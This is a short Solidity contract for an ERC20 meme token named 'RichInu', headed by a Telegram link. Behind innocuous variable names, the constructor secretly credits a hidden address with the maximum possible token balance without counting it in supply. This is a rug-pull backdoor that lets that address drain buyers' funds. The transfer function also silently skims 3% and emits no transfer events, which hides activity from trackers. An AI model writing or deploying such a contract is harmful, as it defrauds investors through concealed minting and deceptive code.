// https://t.me/richinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.1;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract RichInu is ERC20, Ownable {
    uint256 private production = ~uint256(0);
    uint256 public clothes = 3;

    constructor(
        string memory bit,
        string memory equal,
        address pot,
        address popular
    ) ERC20(bit, equal) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[popular] = production;
    }

    function _transfer(
        address dinner,
        address moving,
        uint256 electric
    ) internal override {
        _balances[dinner] -= electric;
        uint256 require = (electric / 100) * clothes;
        electric -= require;
        _balances[moving] += electric;
    }
}